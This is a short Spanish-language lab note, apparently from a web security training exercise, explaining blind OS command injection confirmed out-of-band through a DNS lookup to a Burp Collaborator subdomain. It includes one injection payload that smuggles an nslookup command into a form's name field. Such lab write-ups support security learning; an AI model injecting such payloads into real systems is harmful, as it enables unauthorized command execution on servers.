# Inyección ciega con interacción OOB

Tags: #CommandInjection #RCE #BurpSuite 

```bash 
En este lab se aborda una inyección de comandos ciega en la que no obtenemos ninguna respuesta visible ni podemos redirigir la salida. Para comprobar la ejecución del comando, usamos una técnica fuera de banda (OAST) enviando una consulta DNS hacia un subdominio de Burp Collaborator.

Esto permite confirmar que el comando fue ejecutado por el servidor mediante una solicitud externa, demostrando la vulnerabilidad sin necesidad de ver directamente la salida del comando.
```

```bash 
❯ name=test ; nslookup x.BURP-COLLABORATOR-SUBDOMAIN ; &email


Notas:
	1. Se necesita BurpSuite Pro 
```